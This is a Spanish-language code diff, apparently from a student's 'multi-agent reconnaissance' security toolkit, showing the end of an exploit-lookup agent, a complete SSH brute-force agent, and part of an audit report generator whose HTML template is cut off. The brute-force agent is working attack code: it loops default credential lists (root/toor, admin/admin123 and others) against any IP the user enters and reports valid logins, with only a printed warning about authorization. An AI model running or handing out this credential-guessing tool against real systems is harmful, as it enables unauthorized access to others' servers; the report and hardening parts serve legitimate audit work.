+        """Muestra resultados en formato profesional."""
+        
+        print("\n" + "="*70)
+        print("BÚSQUEDA DE EXPLOITS PÚBLICOS")
+        print("="*70)
+        
+        print(f"\nExploits encontrados: {resultados['total_exploits']}")
+        print(f"CVEs sin exploit público: {resultados['total_sin_exploit']}")
+        
+        if resultados['exploits_encontrados']:
+            print("\n📌 EXPLOITS DISPONIBLES:")
+            
+            for i, exploit in enumerate(resultados['exploits_encontrados'], 1):
+                print(f"\n{i}. {exploit.get('cve', 'UNKNOWN')}")
+                print(f"   Servicio: {exploit.get('servicio', '?')}")
+                print(f"   Descripción: {exploit.get('descripción', '?')}")
+                print(f"   Tipo: {exploit.get('tipo_exploit', '?')}")
+                print(f"   Dificultad: {exploit.get('dificultad', '?')}")
+                print(f"   Impacto: {exploit.get('impacto', '?')}")
+                
+                print("\n   Pasos de implementación:")
+                for j, paso in enumerate(exploit.get('pasos', []), 1):
+                    print(f"      {j}. {paso}")
+                
+                print(f"\n   Más info: {exploit.get('url', 'N/A')}")
+        
+        if resultados['exploits_no_encontrados']:
+            print("\n⚠️  CVEs SIN EXPLOIT PÚBLICO:")
+            for cve in resultados['exploits_no_encontrados']:
+                print(f"   • {cve} (investigación manual requerida)")
+        
+        print("\n" + "-"*70)
+        print(resultados['estrategia_recomendada'])
+        print("-"*70)
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║   AGENTE 4: VULNERABILITY CHECKER    ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("╚════════════════════════════════════════╝")
+    
+    # Ejemplo: CVEs del Agente 3
+    cves_ejemplo = [
+        {
+            "cve": "CVE-2018-15473",
+            "descripción": "SSH User Enumeration"
+        },
+        {
+            "cve": "CVE-2018-20225",
+            "descripción": "RCE via scp"
+        },
+        {
+            "cve": "CVE-9999-99999",
+            "descripción": "CVE ficticia sin exploit"
+        }
+    ]
+    
+    checker = VulnerabilityChecker()
+    resultados = checker.buscar_exploits(cves_ejemplo)
+    checker.mostrar_resultados(resultados)
+    
+    # Guardar resultados
+    import json
+    with open("exploit_search_results.json", 'w', encoding='utf-8') as f:
+        json.dump(resultados, f, indent=2, ensure_ascii=False)
+    
+    print(f"\n✓ Resultados guardados en: exploit_search_results.json")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+
+
+🤖 AGENTE 5: BRUTE FORCE / ACCESS AGENT
+
+import paramiko
+import time
+from typing import Dict, List, Optional, Tuple
+from datetime import datetime
+import warnings
+
+# Suprimir warnings de paramiko
+warnings.filterwarnings("ignore")
+
+class BruteForceAgent:
+    """
+    Agente de fuerza bruta SSH.
+    
+    Objetivo: Intentar acceso SSH con diferentes combinaciones de
+    usuario/contraseña.
+    
+    ⚠️ ADVERTENCIA:
+    - SOLO usar en máquinas autorizadas
+    - En máquinas de otros es ILEGAL
+    - El servidor puede bloquear la cuenta después de N intentos fallidos
+    - Respetar delays para no activar alarmas
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    def __init__(self, timeout: int = 5):
+        """
+        Inicializa el agente.
+        
+        Args:
+            timeout (int): Segundos para esperar respuesta SSH
+        """
+        self.timeout = timeout
+        self.intentos_realizados = 0
+        self.acceso_logrado = False
+        self.credenciales_válidas = {}
+        self.historial = []
+    
+    def cargar_diccionario_local(self, archivo_usuarios: str = None,
+                                 archivo_contraseñas: str = None) -> Tuple[List[str], List[str]]:
+        """
+        Carga listas de usuarios y contraseñas desde archivos locales.
+        
+        Si no existen, usa listas predeterminadas.
+        
+        Args:
+            archivo_usuarios (str): Archivo con usuarios (1 por línea)
+            archivo_contraseñas (str): Archivo con contraseñas (1 por línea)
+        
+        Returns:
+            Tuple[List, List]: (usuarios, contraseñas)
+        """
+        
+        # Usuarios por defecto
+        usuarios_default = [
+            "root", "admin", "user", "test", "ubnt",
+            "pi", "postgres", "mysql", "www-data"
+        ]
+        
+        # Contraseñas por defecto (comunes)
+        contraseñas_default = [
+            "admin", "root", "toor", "password", "123456",
+            "12345678", "1234567890", "admin123", "root123",
+            "default", "ubnt", "vagrant", "123"
+        ]
+        
+        # Intentar cargar archivos si existen
+        usuarios = usuarios_default
+        contraseñas = contraseñas_default
+        
+        if archivo_usuarios:
+            try:
+                with open(archivo_usuarios, 'r') as f:
+                    usuarios = [line.strip() for line in f if line.strip()]
+                print(f"[+] Usuarios cargados desde {archivo_usuarios}: {len(usuarios)}")
+            except FileNotFoundError:
+                print(f"[-] Archivo {archivo_usuarios} no encontrado, usando default")
+        
+        if archivo_contraseñas:
+            try:
+                with open(archivo_contraseñas, 'r') as f:
+                    contraseñas = [line.strip() for line in f if line.strip()]
+                print(f"[+] Contraseñas cargadas desde {archivo_contraseñas}: {len(contraseñas)}")
+            except FileNotFoundError:
+                print(f"[-] Archivo {archivo_contraseñas} no encontrado, usando default")
+        
+        return usuarios, contraseñas
+    
+    def intentar_acceso_ssh(self, ip: str, puerto: int,
+                          usuario: str, contraseña: str) -> Dict:
+        """
+        Intenta conectar a SSH con credenciales específicas.
+        
+        Args:
+            ip (str): IP objetivo
+            puerto (int): Puerto SSH
+            usuario (str): Usuario a intentar
+            contraseña (str): Contraseña a intentar
+        
+        Returns:
+            Dict: Resultado del intento
+        """
+        
+        try:
+            # Crear cliente SSH
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # Intentar conectar
+            ssh.connect(
+                ip,
+                port=puerto,
+                username=usuario,
+                password=contraseña,
+                timeout=self.timeout,
+                allow_agent=False,
+                look_for_keys=False
+            )
+            
+            # Si llegó aquí, ¡conexión exitosa!
+            ssh.close()
+            
+            return {
+                "estado": "éxito",
+                "mensaje": "Conexión SSH exitosa",
+                "usuario": usuario,
+                "contraseña": contraseña
+            }
+        
+        except paramiko.AuthenticationException:
+            return {
+                "estado": "falló",
+                "mensaje": "Autenticación rechazada",
+                "usuario": usuario,
+                "contraseña": contraseña
+            }
+        
+        except paramiko.SSHException as e:
+            # Podría ser cuenta bloqueada u otro error de SSH
+            if "too many" in str(e).lower() or "locked" in str(e).lower():
+                return {
+                    "estado": "cuenta_bloqueada",
+                    "mensaje": "Cuenta bloqueada por múltiples intentos fallidos",
+                    "usuario": usuario,
+                    "contraseña": contraseña
+                }
+            else:
+                return {
+                    "estado": "error_ssh",
+                    "mensaje": str(e),
+                    "usuario": usuario,
+                    "contraseña": contraseña
+                }
+        
+        except Exception as e:
+            return {
+                "estado": "error",
+                "mensaje": str(e),
+                "usuario": usuario,
+                "contraseña": contraseña
+            }
+    
+    def brute_force(self, ip: str, puerto: int = 22,
+                   usuarios: List[str] = None,
+                   contraseñas: List[str] = None,
+                   max_intentos: int = 10,
+                   delay: int = 300) -> Dict:
+        """
+        Ejecuta brute force SSH.
+        
+        PARÁMETROS RECOMENDADOS:
+        - max_intentos: 10 (por seguridad)
+        - delay: 300 segundos (5 minutos entre intentos)
+        
+        Args:
+            ip (str): IP objetivo
+            puerto (int): Puerto SSH (default 22)
+            usuarios (List): Lista de usuarios a probar
+            contraseñas (List): Lista de contraseñas a probar
+            max_intentos (int): Máximo de intentos
+            delay (int): Segundos a esperar entre intentos
+        
+        Returns:
+            Dict: Resultados del brute force
+        """
+        
+        # Usar default si no proporciona
+        if not usuarios or not contraseñas:
+            usuarios, contraseñas = self.cargar_diccionario_local()
+        
+        print("\n[*] Iniciando brute force SSH")
+        print(f"[*] Objetivo: {ip}:{puerto}")
+        print(f"[*] Usuarios a probar: {len(usuarios)}")
+        print(f"[*] Contraseñas por usuario: {len(contraseñas)}")
+        print(f"[*] Máximo de intentos: {max_intentos}")
+        print(f"[*] Delay entre intentos: {delay} segundos ({delay/60:.1f} minutos)\n")
+        
+        # Generar combinaciones
+        combinaciones = [
+            (u, c) for u in usuarios for c in contraseñas
+        ]
+        
+        inicio = datetime.now()
+        
+        # Iterar sobre combinaciones
+        for usuario, contraseña in combinaciones:
+            
+            # Verificar límite de intentos
+            if self.intentos_realizados >= max_intentos:
+                print("[!] Límite de intentos alcanzado")
+                break
+            
+            self.intentos_realizados += 1
+            
+            # Mostrar intento
+            print(f"[*] Intento {self.intentos_realizados}/{max_intentos}: "
+                  f"{usuario}:{contraseña}", end=" → ")
+            
+            # Intentar acceso
+            resultado = self.intentar_acceso_ssh(ip, puerto, usuario, contraseña)
+            
+            # Registrar en historial
+            self.historial.append({
+                "intento": self.intentos_realizados,
+                "usuario": usuario,
+                "contraseña": contraseña,
+                "resultado": resultado["estado"],
+                "mensaje": resultado["mensaje"],
+                "timestamp": datetime.now().isoformat()
+            })
+            
+            # Procesar resultado
+            if resultado["estado"] == "éxito":
+                print("✓ ÉXITO")
+                print(f"\n[+] ✓✓✓ ACCESO LOGRADO ✓✓✓")
+                print(f"[+] Usuario: {usuario}")
+                print(f"[+] Contraseña: {contraseña}")
+                
+                self.acceso_logrado = True
+                self.credenciales_válidas = {
+                    "usuario": usuario,
+                    "contraseña": contraseña,
+                    "ip": ip,
+                    "puerto": puerto
+                }
+                
+                break  # Detener si obtiene acceso
+            
+            elif resultado["estado"] == "falló":
+                print("✗")
+            
+            elif resultado["estado"] == "cuenta_bloqueada":
+                print("🔒 BLOQUEADA")
+                print("[!] Cuenta bloqueada, deteniendo brute force")
+                break
+            
+            else:
+                print(f"⚠️ {resultado['estado']}")
+            
+            # Esperar delay ANTES del siguiente intento (excepto el último)
+            if (self.intentos_realizados < max_intentos and 
+                not self.acceso_logrado and 
+                resultado["estado"] != "cuenta_bloqueada"):
+                
+                print(f"[⏱️] Esperando {delay}s ({delay/60:.1f} min) antes del siguiente...")
+                
+                # Mostrar countdown cada 30 segundos
+                tiempo_restante = delay
+                while tiempo_restante > 0:
+                    print(f"    [{tiempo_restante}s]", end="\r")
+                    time.sleep(1)
+                    tiempo_restante -= 1
+                
+                print(" " * 20, end="\r")  # Limpiar línea
+            
+            print()
+        
+        tiempo_total = (datetime.now() - inicio).total_seconds()
+        
+        # Retornar resultados
+        return {
+            "ip": ip,
+            "puerto": puerto,
+            "acceso_logrado": self.acceso_logrado,
+            "credenciales": self.credenciales_válidas,
+            "intentos_totales": self.intentos_realizados,
+            "tiempo_total": tiempo_total,
+            "historial": self.historial,
+            "próximo_paso": "Agente 6: Report Generator" if self.acceso_logrado else "Investigación adicional"
+        }
+    
+    def mostrar_resultados(self, resultados: Dict):
+        """Muestra resultados en formato profesional."""
+        
+        print("\n" + "="*70)
+        print("RESULTADOS DE BRUTE FORCE SSH")
+        print("="*70)
+        
+        print(f"\nIP objetivo: {resultados['ip']}:{resultados['puerto']}")
+        print(f"Intentos realizados: {resultados['intentos_totales']}")
+        print(f"Tiempo total: {resultados['tiempo_total']:.1f} segundos")
+        
+        if resultados['acceso_logrado']:
+            print("\n✓ RESULTADO: ÉXITO")
+            print(f"  Usuario: {resultados['credenciales']['usuario']}")
+            print(f"  Contraseña: {resultados['credenciales']['contraseña']}")
+            print("\n[+] Ahora tienes acceso SSH a la máquina")
+        else:
+            print("\n✗ RESULTADO: FALLÓ")
+            print("   No se encontraron credenciales válidas")
+            print("   Posibles razones:")
+            print("   • Contraseñas no están en el diccionario")
+            print("   • Cuenta está protegida contra brute force")
+            print("   • SSH tiene autenticación por clave únicamente")
+        
+        # Mostrar historial de intentos
+        print("\n📋 HISTORIAL DE INTENTOS:")
+        print("-" * 70)
+        
+        for h in resultados['historial'][:5]:  # Mostrar primeros 5
+            estado_symbol = "✓" if h['resultado'] == 'éxito' else "✗"
+            print(f"  {estado_symbol} {h['usuario']}:{h['contraseña']} → {h['resultado']}")
+        
+        if len(resultados['historial']) > 5:
+            print(f"  ... y {len(resultados['historial']) - 5} intentos más")
+        
+        print("-" * 70)
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║     AGENTE 5: BRUTE FORCE SSH        ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("║                                        ║")
+    print("║ ⚠️  SOLO USAR MÁQUINAS AUTORIZADAS   ║")
+    print("╚════════════════════════════════════════╝")
+    
+    # Obtener entrada
+    ip = input("\nIP objetivo: ").strip()
+    puerto_entrada = input("Puerto SSH (defecto 22): ").strip()
+    puerto = int(puerto_entrada) if puerto_entrada else 22
+    
+    max_intentos = int(input("Máximo de intentos (defecto 10): ") or "10")
+    delay = int(input("Delay en segundos entre intentos (defecto 300 = 5 min): ") or "300")
+    
+    # Ejecutar
+    agent = BruteForceAgent(timeout=5)
+    resultados = agent.brute_force(ip, puerto, max_intentos=max_intentos, delay=delay)
+    
+    agent.mostrar_resultados(resultados)
+    
+    # Guardar resultados
+    import json
+    with open(f"brute_force_{ip.replace('.', '_')}.json", 'w', encoding='utf-8') as f:
+        json.dump(resultados, f, indent=2, ensure_ascii=False)
+    
+    print(f"\n✓ Resultados guardados")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n⛔ Brute force interrumpido")
+    except ImportError:
+        print("❌ Error: Falta instalar paramiko")
+        print("   Ejecuta: pip install paramiko")
+        🤖 AGENTE 6: REPORT GENERATOR (Generador de Reportes Profesionales)
+
+        from datetime import datetime
+from typing import Dict, List
+import json
+import os
+
+class ReportGenerator:
+    """
+    Generador de reportes profesionales de seguridad.
+    
+    Objetivo: Compilar todos los resultados de los agentes anteriores
+    en un reporte profesional (HTML, PDF, JSON).
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    def __init__(self):
+        """Inicializa el generador."""
+        self.timestamp = datetime.now().isoformat()
+        self.fecha_legible = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    
+    def generar_reporte_completo(self, resultados_agentes: Dict, 
+                                ip_objetivo: str) -> Dict:
+        """
+        Genera reporte completo compilando todos los agentes.
+        
+        Args:
+            resultados_agentes (Dict): {agente_1: {...}, agente_2: {...}, ...}
+            ip_objetivo (str): IP que se investigó
+        
+        Returns:
+            Dict: Reporte compilado
+        """
+        
+        print("\n[*] Compilando reporte...")
+        
+        # 1. Resumen ejecutivo
+        resumen = self._generar_resumen_ejecutivo(resultados_agentes)
+        
+        # 2. Hallazgos
+        hallazgos = self._compilar_hallazgos(resultados_agentes, ip_objetivo)
+        
+        # 3. Recomendaciones
+        recomendaciones = self._generar_recomendaciones(resultados_agentes)
+        
+        # 4. Conclusiones
+        conclusiones = self._generar_conclusiones(hallazgos)
+        
+        # 5. Nivel de riesgo
+        nivel_riesgo = self._calcular_nivel_riesgo(hallazgos)
+        
+        reporte = {
+            "metadata": {
+                "titulo": "REPORTE DE AUDITORÍA DE SEGURIDAD",
+                "fecha": self.fecha_legible,
+                "ip_objetivo": ip_objetivo,
+                "generado_por": "Sistema Multiagente de Reconocimiento",
+                "autor": "Diego Mercedes Llauger (2026-0048)",
+                "timestamp": self.timestamp
+            },
+            "nivel_riesgo_general": nivel_riesgo,
+            "resumen_ejecutivo": resumen,
+            "hallazgos": hallazgos,
+            "recomendaciones": recomendaciones,
+            "conclusiones": conclusiones,
+            "estadisticas": self._generar_estadisticas(hallazgos, resultados_agentes)
+        }
+        
+        return reporte
+    
+    def _generar_resumen_ejecutivo(self, resultados: Dict) -> str:
+        """Resumen de 1 página para ejecutivos."""
+        
+        resumen = "RESUMEN EJECUTIVO\n"
+        resumen += "=" * 50 + "\n\n"
+        
+        # Nivel de riesgo
+        nivel = self._calcular_nivel_riesgo_simple(resultados)
+        resumen += f"Nivel de Riesgo Identificado: {nivel}\n\n"
+        
+        # Hallazgos principales
+        puertos = resultados.get('agente_2', {}).get('puertos_abiertos', [])
+        exploits = resultados.get('agente_4', {}).get('total_exploits', 0)
+        acceso = resultados.get('agente_5', {}).get('acceso_logrado', False)
+        
+        resumen += "HALLAZGOS PRINCIPALES:\n"
+        resumen += f"• {len(puertos)} puertos abiertos detectados\n"
+        resumen += f"• {exploits} vulnerabilidades conocidas encontradas\n"
+        
+        if acceso:
+            resumen += "• ⚠️ CRÍTICO: Acceso comprometido - credenciales obtenidas\n"
+        
+        resumen += "\nRECOMENDACIÓN INMEDIATA:\n"
+        if nivel == "🔴 CRÍTICO":
+            resumen += "Tomar medidas inmediatas. Riesgo de compromiso total.\n"
+        elif nivel == "🟠 ALTO":
+            resumen += "Parchear vulnerabilidades identificadas en próximo ciclo.\n"
+        else:
+            resumen += "Monitorear y parchear según disponibilidad.\n"
+        
+        return resumen
+    
+    def _compilar_hallazgos(self, resultados: Dict, ip: str) -> List[Dict]:
+        """Compila todos los hallazgos con evidencia."""
+        
+        hallazgos = []
+        
+        # Hallazgo 1: Info de IP
+        h1 = {
+            "numero": 1,
+            "titulo": "Información de IP Objetivo",
+            "severidad": "INFORMATIVA",
+            "descripción": f"IP {ip} identificada como {resultados.get('agente_1', {}).get('rango', 'desconocida')}"
+        }
+        hallazgos.append(h1)
+        
+        # Hallazgo 2: Puertos abiertos
+        puertos = resultados.get('agente_2', {}).get('puertos_abiertos', [])
+        if puertos:
+            h2 = {
+                "numero": 2,
+                "titulo": "Puertos Abiertos Detectados",
+                "severidad": "MEDIO",
+                "descripción": f"{len(puertos)} puertos abiertos: {puertos}",
+                "impacto": "Potencial punto de entrada para atacantes"
+            }
+            hallazgos.append(h2)
+        
+        # Hallazgo 3: Servicios identificados
+        servicios = resultados.get('agente_3', {})
+        servicios_identificados = [s for s in servicios.values() 
+                                  if isinstance(s, dict) and s.get('estado') == 'identificado']
+        if servicios_identificados:
+            h3 = {
+                "numero": 3,
+                "titulo": "Servicios y Versiones Identificadas",
+                "severidad": "MEDIO",
+                "descripción": f"{len(servicios_identificados)} servicio(s) identificado(s)",
+                "detalles": [f"{s.get('servicio')} {s.get('versión')}" 
+                            for s in servicios_identificados]
+            }
+            hallazgos.append(h3)
+        
+        # Hallazgo 4: Vulnerabilidades
+        exploits = resultados.get('agente_4', {}).get('exploits_encontrados', [])
+        if exploits:
+            h4 = {
+                "numero": 4,
+                "titulo": "Vulnerabilidades Conocidas",
+                "severidad": "ALTO",
+                "descripción": f"{len(exploits)} CVE(s) con exploit público disponible",
+                "cves": [e.get('cve') for e in exploits],
+                "impacto": "Exploit disponible podría llevar a compromiso del sistema"
+            }
+            hallazgos.append(h4)
+        
+        # Hallazgo 5: Acceso comprometido
+        if resultados.get('agente_5', {}).get('acceso_logrado'):
+            creds = resultados['agente_5']['credenciales']
+            h5 = {
+                "numero": 5,
+                "titulo": "ACCESO COMPROMETIDO",
+                "severidad": "CRÍTICO",
+                "descripción": "Credenciales válidas obtenidas mediante brute force SSH",
+                "usuario": creds.get('usuario'),
+                "intentos_requeridos": resultados['agente_5'].get('intentos_totales'),
+                "impacto": "Sistema completamente comprometido. Acceso de shell remoto."
+            }
+            hallazgos.append(h5)
+        
+        return hallazgos
+    
+    def _generar_recomendaciones(self, resultados: Dict) -> List[Dict]:
+        """Genera recomendaciones priorizadas."""
+        
+        recomendaciones = []
+        
+        # Si acceso comprometido: CRÍTICO
+        if resultados.get('agente_5', {}).get('acceso_logrado'):
+            usuario = resultados['agente_5']['credenciales'].get('usuario')
+            rec1 = {
+                "prioridad": "CRÍTICO",
+                "plazo": "INMEDIATO (0-24 horas)",
+                "titulo": "Cambiar credenciales SSH",
+                "descripción": f"El usuario '{usuario}' está comprometido",
+                "pasos": [
+                    "1. Cambiar contraseña del usuario desde consola física",
+                    "2. Revisar logs SSH para detectar acceso del atacante",
+                    "3. Auditar comandos ejecutados",
+                    "4. Cambiar contraseñas relacionadas en otros sistemas"
+                ]
+            }
+            recomendaciones.append(rec1)
+        
+        # Parchear CVEs
+        exploits = resultados.get('agente_4', {}).get('exploits_encontrados', [])
+        for exploit in exploits[:3]:  # Top 3 CVEs
+            rec = {
+                "prioridad": "ALTO",
+                "plazo": "1-7 días",
+                "titulo": f"Parchear {exploit.get('cve')}",
+                "descripción": exploit.get('descripción'),
+                "servicio": exploit.get('servicio'),
+                "pasos": [
+                    f"1. Actualizar {exploit.get('servicio')} a versión paracheada",
+                    "2. Probar en ambiente de staging",
+                    "3. Monitorear post-parche para comportamientos anormales"
+                ]
+            }
+            recomendaciones.append(rec)
+        
+        # Hardening general
+        rec_general = {
+            "prioridad": "MEDIO",
+            "plazo": "2-4 semanas",
+            "titulo": "Hardening de Seguridad General",
+            "descripción": "Mejoras generales de seguridad",
+            "pasos": [
+                "1. Implementar fail2ban para bloquear brute force",
+                "2. Restringir acceso SSH a IPs específicas",
+                "3. Implementar auditoría de logs",
+                "4. Actualizar todas las dependencias regularmente",
+                "5. Implementar WAF si es aplicable"
+            ]
+        }
+        recomendaciones.append(rec_general)
+        
+        return recomendaciones
+    
+    def _generar_conclusiones(self, hallazgos: List[Dict]) -> str:
+        """Genera conclusiones finales."""
+        
+        conclusiones = "CONCLUSIONES\n"
+        conclusiones += "=" * 50 + "\n\n"
+        
+        # Contar severidades
+        criticos = len([h for h in hallazgos if h.get('severidad') == 'CRÍTICO'])
+        altos = len([h for h in hallazgos if h.get('severidad') == 'ALTO'])
+        medios = len([h for h in hallazgos if h.get('severidad') == 'MEDIO'])
+        
+        conclusiones += "Hallazgos identificados:\n"
+        conclusiones += f"• Severidad CRÍTICA: {criticos}\n"
+        conclusiones += f"• Severidad ALTA: {altos}\n"
+        conclusiones += f"• Severidad MEDIA: {medios}\n\n"
+        
+        if criticos > 0:
+            conclusiones += (
+                "El sistema presenta vulnerabilidades CRÍTICAS que deben ser "
+                "remediadas de inmediato. Existe riesgo elevado de compromiso.\n\n"
+            )
+        elif altos > 0:
+            conclusiones += (
+                "El sistema presenta vulnerabilidades de alto riesgo que deben "
+                "ser parchadas en el próximo ciclo de actualización.\n\n"
+            )
+        else:
+            conclusiones += (
+                "El sistema es relativamente seguro, pero se recomiendan mejoras "
+                "para fortalecer la postura de seguridad.\n\n"
+            )
+        
+        conclusiones += (
+            "Este reporte fue generado automáticamente por el Sistema Multiagente "
+            "de Reconocimiento (Diego Mercedes Llauger, 2026-0048).\n\n"
+            "Para validar hallazgos o consultas, contactar al equipo de ciberseguridad."
+        )
+        
+        return conclusiones
+    
+    def _calcular_nivel_riesgo(self, hallazgos: List[Dict]) -> str:
+        """Calcula nivel de riesgo general."""
+        
+        criticos = len([h for h in hallazgos if h.get('severidad') == 'CRÍTICO'])
+        altos = len([h for h in hallazgos if h.get('severidad') == 'ALTO'])
+        
+        if criticos > 0:
+            return "🔴 CRÍTICO"
+        elif altos >= 2:
+            return "🟠 ALTO"
+        elif altos > 0:
+            return "🟡 MEDIO"
+        else:
+            return "🟢 BAJO"
+    
+    def _calcular_nivel_riesgo_simple(self, resultados: Dict) -> str:
+        """Versión simple para resumen ejecutivo."""
+        hallazgos = self._compilar_hallazgos(resultados, "N/A")
+        return self._calcular_nivel_riesgo(hallazgos)
+    
+    def _generar_estadisticas(self, hallazgos: List[Dict], 
+                             resultados: Dict) -> Dict:
+        """Genera estadísticas del reporte."""
+        
+        return {
+            "total_hallazgos": len(hallazgos),
+            "puertos_abiertos": len(resultados.get('agente_2', {}).get('puertos_abiertos', [])),
+            "servicios_identificados": len([h for h in hallazgos if 'Servicios' in h.get('titulo', '')]),
+            "vulnerabilidades_encontradas": resultados.get('agente_4', {}).get('total_exploits', 0),
+            "acceso_comprometido": resultados.get('agente_5', {}).get('acceso_logrado', False),
+            "criticos": len([h for h in hallazgos if h.get('severidad') == 'CRÍTICO']),
+            "altos": len([h for h in hallazgos if h.get('severidad') == 'ALTO']),
+            "medios": len([h for h in hallazgos if h.get('severidad') == 'MEDIO'])
+        }
+    
+    def exportar_html(self, reporte: Dict, ip_objetivo: str) -> str:
+        """Exporta reporte a HTML profesional."""
+        
+        html = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>REPORTE DE AUDITORÍA DE SEGURIDAD</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f4f4f4;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        header {
+            border-bottom: 3px solid #c41e3a;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+        }
+        h1 {
+            color: #c41e3a;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #2c3e50;
+            font-size: 20px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            border-left: 5px solid #c41e3a;
+            padding-left: 15px;
+        }
+        h3 {
+            color: #34495e;
+            font-size: 16px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        .metadata {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+            background: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .metadata p {
+            margin: 5px 0;
+        }
+        .metadata strong {
+            color: #c41e3a;
+        }
+        .riesgo {
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .riesgo.critico {
+            background: #ffcccc;
+            color: #c41e3a;
+            border-left: 5px solid #c41e3a;
+        }
+        .riesgo.alto {
+            background: #fff3cd;
+            color: #856404;
+            border-left: 5px solid #ffc107;
+        }
+        .riesgo.medio {
+            background: #fff3cd;
+            color: #856404;
+            border-left: 5px solid #ffc107;
+        }
+        .riesgo.bajo {
+            background: #d4edda;
+            color: #155724;
+            border-left: 5px solid #28a745;
+        }
+        .hallazgo {
+            background: #f8f9fa;
+            border-left: 4px solid #c41e3a;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+        }
+        .severidad {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .severidad.critico {
+            background: #c41e3a;
+            color: white;
+        }
+        .severidad.alto {
+            background: #ff9800;
+            color: white;
+        }
+        .severidad.medio {
+            background: #ffc107;
+            color: #333;
+        }
+        .severidad.informativa {
+            background: #2196F3;
+            color: white;
+        }
+        .recomendacion {
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 3px;
+        }
+        .recomendacion strong {
+            color: #1976D2;
+        }
+        .pasos {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        .pasos li {
+            margin: 5px 0;
+            color: #555;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background: #c41e3a;
+            color: white;
+            font-weight: bold;
+        }
+        tr:nth-child(even) {
+            background: #f8f9fa;
+        }
+        footer {
+            border-top: 1px solid #ddd;
+            margin-top: 40px;
+            padding-top: 20px;
+            color: #777;
+            font-size: 12px;
+            text-align: center;
+        }
+        .resumen-ejecutivo {
+            background: #fff3cd;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 5px solid #ffc107;
+        }
+        .estadisticas {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat {
+            background: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .stat .numero {
+            font-size: 28px;
+            font-weight: bold;
+            color: #c41e3a;
+        }
+        .stat .label {
+            font-size: 12px;
+            color: #777;
+            margin-top: 5px;
+        }
+        @media print {
+            body { background: white; }
+            .container { box-shadow: none; }
+            .page-break { page-break-after: always; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔐 REPORTE DE AUDITORÍA DE SEGURIDAD</h1>
+            <div class="metadata">
+                <p><strong>Fecha:</strong> {fecha}</p>
+                <p><strong>IP Objetivo:</strong> {ip}</p>
+                <p><strong>Generado por:</strong> Sistema Multiagente de Reconocimiento</p>
+                <p><strong>Autor:</strong> Diego Mercedes Llauger (2026-0048)</p>
+            </div>
+        </header>
+        
+        <div class="riesgo {nivel_riesgo_clase}">
+            Nivel de Riesgo General: {nivel_riesgo}
+        </div>
+        
+        <h2>📋 RESUMEN EJECUTIVO</h2>
+        <div class="resumen-ejecutivo">
+            {resumen}
+        </div>
+        
+        <h2>📊 ESTADÍSTICAS</h2>
+        <div class="estadisticas">
+            <div class="stat">
+                <div class="numero">{total_hallazgos}</div>
+                <div class="label">Hallazgos Totales</div>
+            </div>
+            <div class="stat">
+                <div class="numero">{puertos_abiertos}</div>
+                <div class="label">Puertos Abiertos</div>
+            </div>
+            <div class="stat">
+                <div class="numero">{vulnerabilidades}</div>
+                <div class="label">Vulnerabilidades</div>
+            </div>
+            <div class="stat">
+                <div class="numero">{criticos}</div>
+                <div class="label">Críticos</div>
+            </div>
+        </div>
+        
+        <h2>🔍 HALLAZGOS DETALLADOS</h2>
+        {hallazgos_html}
+        
+        <h2>💡 RECOMENDACIONES</h2>
+        {recomendaciones_html}
+        
+        <h2>📝 CONCLUSIONES</h2>
+        <div style="background: #f8f9fa; padding: 20px; border-radius: 5px; white-space: pre-wrap;">
+{conclusiones}
+        </div>
+        
+        <footer>
+            <p>Este reporte fue generado automáticamente por el Sistema Multiagente de Reconocimiento</p>
+            <p>Para validar hallazgos o consultas, contactar al equipo de ciberseguridad</p>
+            <p>Fecha y hora de generación: {timestamp}</p>
+        </footer>
+    </div>
+</body>
+</html>"""
+        
+        # Generar HTML de hallazgos
+        hallazgos_html = ""
+        for h in reporte['hallazgos']:
+            hallazgos_html += f"""
+        <div class="hallazgo">
